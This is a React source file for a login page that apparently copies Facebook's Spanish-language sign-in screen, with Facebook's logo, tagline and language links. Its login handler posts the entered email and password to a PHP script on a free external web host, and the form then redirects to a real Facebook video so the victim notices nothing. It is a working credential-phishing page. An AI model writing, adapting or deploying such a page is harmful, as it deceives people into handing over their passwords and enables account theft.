import logo from '../images/logo.PNG';
import {React,useState} from 'react'
import axios from 'axios'

function Login(){
    const url="https://proyectotallerbasededatostecuruapan.000webhostapp.com/fb/php/api_fb.php"
    const [usuario,setUsuario]=useState({
        email:'',
        pass:''
    })
    const{email,pass}=usuario
    const handleInputChange=(event)=>{
        setUsuario(
            {
                ...usuario,
            [event.target.name] : event.target.value
            }
            
        )     
    }
    const login=async()=>{
         await axios.post(url,JSON.stringify({tipo:1,email,pass}))
    }
 
    return(
        
        <div className="center">
            <div id="DIV_1">
        <div id="DIV_2">
            <div id="DIV_3">
                <div id="DIV_4">
                    <img src={logo} alt="Facebook" />
                </div>
                <h2 id="H2_6">
                    Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.
                </h2>
            </div>
            <div id="DIV_7">
                <div id="DIV_8">
                    <div id="DIV_9">
                        <form  action="https://www.facebook.com/BadabunOficial/videos/1148583618926761" >
                            <input type="hidden" name="jazoest" value="21102" id="INPUT_11" />
                            <input type="hidden" name="lsd" value="AVrMXxjwfns" id="INPUT_12" />
                            <div id="DIV_13">
                                <div id="DIV_14">
                                    <input required onChange={handleInputChange} type="email" name="email" id="INPUT_15" placeholder="Correo electrónico o número de teléfono" />
                                </div>
                                <div id="DIV_16">
                                    <input required onChange={handleInputChange} type="password" name="pass" id="INPUT_17" placeholder="Contraseña" />
                                </div>
                            </div>
                            <input type="hidden" name="login_source" value="comet_headerless_login" id="INPUT_18" />
                            <input type="hidden" name="next" id="INPUT_19" />
                            <div id="DIV_20">
                                <button onClick={login} value="1" name="login" type="submit" id="BUTTON_21">
                                    Iniciar sesión
                                </button>
                            </div>
                            <div id="DIV_22">
                                <a href="" id="A_23">¿Olvidaste tu contraseña?</a>
                            </div>
                            <div id="DIV_24">
                            </div>
                            <div id="DIV_25">
                                <a href="" id="A_26" rel="async">Crear cuenta nueva</a>
                            </div>
                        </form>
                    </div>
                    <div id="DIV_27">
                        <a href="" id="A_28">Crea una página</a> para un personaje público, un grupo de música o un negocio.
                    </div>
                </div>
            </div>
        </div>
    </div>
        <div className="face">
        <ul id="UL_5">
					<li id="LI_6">
						Español
					</li>
					<li id="LI_7">
						<a href="https://www.facebook.com/" title="English (US)" id="A_8">English (US)</a>
					</li>
					<li id="LI_9">
						<a href="https://pt-br.facebook.com/" title="Portuguese (Brazil)" id="A_10">Português (Brasil)</a>
					</li>
					<li id="LI_11">
						<a href="https://fr-fr.facebook.com/" title="French (France)" id="A_12">Français (France)</a>
					</li>
					<li id="LI_13">
						<a href="https://de-de.facebook.com/" title="German" id="A_14">Deutsch</a>
					</li>
					<li id="LI_15">
						<a href="https://it-it.facebook.com/" title="Italian" id="A_16">Italiano</a>
					</li>
					<li id="LI_17">
						<a href="https://ja-jp.facebook.com/" title="Japanese" id="A_18">日本語</a>
					</li>
					<li id="LI_19">
						<a href="https://ar-ar.facebook.com/" title="Arabic" id="A_20">العربية</a>
					</li>
					<li id="LI_21">
						<a href="https://hi-in.facebook.com/" title="Hindi" id="A_22">हिन्दी</a>
					</li>
					<li id="LI_23">
						<a href="https://zh-cn.facebook.com/" title="Simplified Chinese (China)" id="A_24">中文(简体)</a>
					</li>
                    <li id="LI_15">
						<a href="https://it-it.facebook.com/" title="Italian" id="A_16">Italiano</a>
					</li>
					<li id="LI_17">
						<a href="https://ja-jp.facebook.com/" title="Japanese" id="A_18">日本語</a>
					</li>
					<li id="LI_19">
						<a href="https://ar-ar.facebook.com/" title="Arabic" id="A_20">العربية</a>
					</li>
					<li id="LI_21">
						<a href="https://hi-in.facebook.com/" title="Hindi" id="A_22">हिन्दी</a>
					</li>
					<li id="LI_23">
						<a href="https://zh-cn.facebook.com/" title="Simplified Chinese (China)" id="A_24">中文(简体)</a>
					</li>
                    <li id="LI_15">
						<a href="https://it-it.facebook.com/" title="Italian" id="A_16">Italiano</a>
					</li>
					<li id="LI_17">
						<a href="https://ja-jp.facebook.com/" title="Japanese" id="A_18">日本語</a>
					</li>
					<li id="LI_19">
						<a href="https://ar-ar.facebook.com/" title="Arabic" id="A_20">العربية</a>
					</li>
                    <li id="LI_9">
						<a href="https://pt-br.facebook.com/" title="Portuguese (Brazil)" id="A_10">Português (Brasil)</a>
					</li>
				
					
					
				</ul>
        </div>
    <div className="face">Facebook © 2021</div>
    </div>
      
        
    )
}
export default Login






                
				
					
